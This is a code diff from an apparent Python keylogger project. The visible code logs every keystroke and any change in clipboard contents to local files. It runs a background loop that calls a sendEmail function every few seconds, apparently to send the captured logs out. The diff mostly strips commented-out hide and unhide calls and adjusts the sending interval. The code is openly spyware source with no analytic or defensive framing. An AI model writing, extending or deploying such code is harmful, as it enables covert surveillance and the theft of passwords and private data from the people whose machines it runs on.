@@ -11,8 +11,6 @@ from emailFunctionality import sendEmail
 from encryption import encryptContents 
 
 ThreadRunning = True
-# file_lock = threading.Lock()
-
 
 log_file = "logs.txt"
 clipBoard_file = "clipBoardLogs.txt"
@@ -26,17 +24,12 @@ def on_press(key):
     if key == keyboard.Key.esc:
         print("escape")
         ThreadRunning = False
-        # unhide()
-        # remove()
-        # atexit.register(remove)
         return False  
     
     keyPressed = returnKeyType(key)
 
-    # unhide()
     with open(log_file, "a") as keyLogs:
         keyLogs.write(parseOutput(keyPressed))
-    # hide()
 
 def returnKeyType(key):
     try:
@@ -60,26 +53,18 @@ def checkClipBoard():
         if currContent != prevContent:
             prevContent = currContent
 
-            # unhide()
         with open(clipBoard_file, "a") as clipBoardKeyLogs:
             clipBoardKeyLogs.write(parseOutput(prevContent))
-            # hide()
         time.sleep(1)
     
-
 def sendToEmail():
 
     while ThreadRunning:
-        # with file_lock:
-        #     unhide()
+
         sendEmail()
-            # hide()
-        time.sleep(4)
+        time.sleep(5)
 
     return
-
-
-
 
 if __name__ == "__main__":
     try: 
@@ -95,9 +80,6 @@ if __name__ == "__main__":
         listener.start() 
         listener.join()
 
-
-
-  
     except KeyboardInterrupt:
         ThreadRunning = False
         
